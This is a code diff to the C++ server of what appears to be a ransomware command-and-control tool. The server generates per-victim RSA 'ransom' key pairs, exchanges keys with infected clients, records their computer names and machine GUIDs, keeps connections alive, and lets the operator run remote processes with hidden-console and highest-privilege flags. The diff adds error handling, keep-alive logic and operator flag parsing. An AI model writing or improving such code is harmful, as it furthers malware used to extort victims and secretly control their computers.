@@ -1,5 +1,6 @@
 #include "ServerInterface.h"
 #include "Serialization.h"
+#include "NetworkCommon.h"
 
 #include <openssl/evp.h>
 #include <openssl/rsa.h>
@@ -89,31 +90,31 @@ BOOL ServerInterface::ExchangePublicKeys(long cuid) {
 	i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);
 
 	int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
-	//if ( sent <= 0 ) {
-	//	free(data);
-	//	return FALSE;
-	//}
+	if ( sent <= 0 ) {
+		free(data);
+		return FALSE;
+	}
 
 	sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
-	//if ( sent <= 0 ) {
-	//	free(data);
-	//	return FALSE;
-	//}
+	if ( sent <= 0 ) {
+		free(data);
+		return FALSE;
+	}
 
 	free(data); // i2d_RSAPublicKey mallocs so free it
 
 	// now receive the public key
 	int clientLen = 0;
 	int received = Receive(client->GetSocket(), ( char* ) &clientLen, sizeof(clientLen), 0);
-	//if ( received <= 0 )
-	//	return FALSE;
+	if ( received <= 0 )
+		return FALSE;
 
 	unsigned char* clientDer = ( unsigned char* ) malloc(clientLen);
 	received = Receive(client->GetSocket(), ( char* ) clientDer, clientLen, 0);
-	//if ( received <= 0 ) {
-	//	free(clientDer);
-	//	return FALSE;
-	//}
+	if ( received <= 0 ) {
+		free(clientDer);
+		return FALSE;
+	}
 
 	const unsigned char* constDer = clientDer;
 
@@ -389,6 +390,72 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 	}
 }
 
+void ServerInterface::OnKeepAliveEcho(long cuid, BYTESTRING receivedEncrypted) {
+	Client* client = GetClientPtr(cuid);
+	if ( !client )
+		return;
+
+	Packet keepAlive;
+	keepAlive.action = RemoteAction::kKeepAlive;
+	keepAlive.buffLen = 0;
+	BYTESTRING encryptedSent = LGCrypto::RSAEncrypt(Serialization::SerializeStruct(keepAlive), client->ClientPublicKey, FALSE);
+
+	if ( receivedEncrypted.size() == encryptedSent.size() ) {
+		client->KeepAliveProcess = FALSE;
+		client->KeepAliveSuccess = TRUE;
+	}
+	else {
+		client->KeepAliveSuccess = FALSE;
+	}
+}
+
+void ServerInterface::SendKeepAlivePackets(long cuid) {
+	Client* client = GetClientPtr(cuid);
+	if ( !client )
+		return;
+
+	do {
+		client->KeepAliveSuccess = FALSE;
+
+		std::cout << "Sending keep-alive packet to " << cuid << "..." << std::endl;
+
+		Packet keepAlive;
+		keepAlive.action = RemoteAction::kKeepAlive;
+		keepAlive.buffLen = 0;
+		BYTESTRING encryptedOriginal = LGCrypto::RSAEncrypt(Serialization::SerializeStruct(keepAlive), client->ClientPublicKey, FALSE);
+
+		client->KeepAliveProcess = TRUE;
+
+		NetCommon::SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
+		BOOL sent = NetCommon::TransmitData(encryptedOriginal, client->GetSocket(), TCP);
+		NetCommon::ResetSocketTimeout(client->GetSocket(), SO_SNDTIMEO);
+		if ( !sent ) {
+			std::cout << "Error sending keep-alive packet. Removing client..." << std::endl;
+			RemoveClientFromServer(client);
+			break;
+		}
+
+		BYTESTRING encryptedReceived;
+		NetCommon::SetSocketTimeout(client->GetSocket(), 2000, SO_RCVTIMEO);
+		BOOL recv = NetCommon::ReceiveData(encryptedReceived, client->GetSocket(), TCP);
+		NetCommon::ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
+
+		client->KeepAliveProcess = FALSE;
+
+		if ( client->KeepAliveSuccess == TRUE ) {
+			std::cout << "Successful keep-alive procedure." << std::endl;
+			Sleep(ReadConfig().keepAliveIntervalMs);
+		}
+		else {
+			std::cout << "failed" << std::endl;
+			RemoveClientFromServer(client);
+			break;
+		}
+	} while ( client->Alive );
+
+	std::cout << "Removed..." << std::endl;
+}
+
 /**
  * Receive TCP messages from a client and perform requests based on those messages.
  * 
@@ -400,13 +467,6 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	if ( client == nullptr )
 		return;
 
-	GetClientComputerName(cuid); 
-	GetClientMachineGUID(cuid);
-
-	if ( IsClientInSaveFile(client->GetMachineGUID()) )
-		GetClientSaveFile(client->ClientUID);
-
-	SaveServerState();
 	PingClient(cuid);
 
 	// tcp receive main loop
@@ -414,7 +474,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
 	do
 	{
-		if ( client->ExpectingResponse ) {
+		if ( client->ExpectingResponse || client->KeepAliveProcess == TRUE ) {
 			Sleep(100);
 			continue;
 		}
@@ -422,8 +482,16 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		BYTESTRING encrypted;
 		BYTESTRING decrypted;
 		ClientRequest request;
-
+		
 		BOOL received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
+		if ( !received )
+			continue;
+
+		if ( client->KeepAliveProcess == TRUE ) {
+			OnKeepAliveEcho(client->ClientUID, encrypted);
+			continue;
+		}
+
 		decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
 		if ( !LGCrypto::GoodDecrypt(decrypted) )
 			continue;
@@ -433,7 +501,9 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		std::cout << "Received request" << std::endl;
 
 		BOOL performed = PerformRequest(request, this->m_TCPServerDetails, cuid);
-	} while ( client->Alive );
+	} while ( client->Alive && client->GetSocket() != INVALID_SOCKET );
+
+	std::cout << "Client is not alive... No longer receiving messages" << std::endl;
 }
 
 /**
@@ -475,13 +545,39 @@ void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
 	Client client(connection, incoming);				  // create the client. generate the cuid
 	RSAKeys ransomKeys = LGCrypto::GenerateRSAPair(4096); // generate rsa keys for the client
 	client.SetRansomSecrets(ransomKeys);
-
+	client.Alive = TRUE;
+	
 	AddToClientList(client);			  // add them to the client list
 	ExchangePublicKeys(client.ClientUID); // send server public key, get their public key
+
+	GetClientComputerName(client.ClientUID);
+	GetClientMachineGUID(client.ClientUID);
+
+	if ( IsClientInSaveFile(client.GetMachineGUID()) )
+		GetClientSaveFile(client.ClientUID);
+
+	SaveServerState();
 
 	// create a thread to receive messages from the client
 	std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, client.ClientUID);
 	receive.detach();
+
+	Sleep(5000);
+
+	std::thread keepAlive(&ServerInterface::SendKeepAlivePackets, this, client.ClientUID);
+	keepAlive.detach();
+}
+
+unsigned int ServerInterface::GetFlagsFromInput(const std::string& s) {
+	unsigned int flags = 0;
+	for ( auto& [flagName, flagInfo] : ServerCommandFlags ) {
+		if ( s.find(flagName) == std::string::npos )
+			continue;
+		std::cout << flagName << " ";
+		flags |= flagInfo.flag;
+	}
+	std::cout << std::endl;
+	return flags;
 }
 
 BOOL ServerInterface::HandleUserInput(unsigned int command, Packet& outputCommand) {
@@ -496,7 +592,11 @@ BOOL ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
 		std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
 		std::getline(std::cin, input);
 		
-		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND | NO_CONSOLE;
+		std::cout << "Input name of flags, separated by a semi-colon [e.g 'NO_CONSOLE;USE_CLI']: ";
+		std::string flagInput;
+		std::getline(std::cin, flagInput);
+		
+		cmdInfo.flags = GetFlagsFromInput(flagInput);		
 		cmdInfo.insert(input);
 
 		if ( cmdInfo.buffLen == -1 ) // error
@@ -522,6 +622,13 @@ BOOL ServerInterface::SendCommandsToClients() {
 	std::thread send(&ServerInterface::RunUserInputOnClients, this);
 	send.detach();
 	return TRUE;
+}
+
+void ServerInterface::RemoveClientFromServer(Client* client) {
+	if ( !client )
+		return;
+
+	client->Disconnect();
 }
 
 void ServerInterface::OutputServerCommands() {
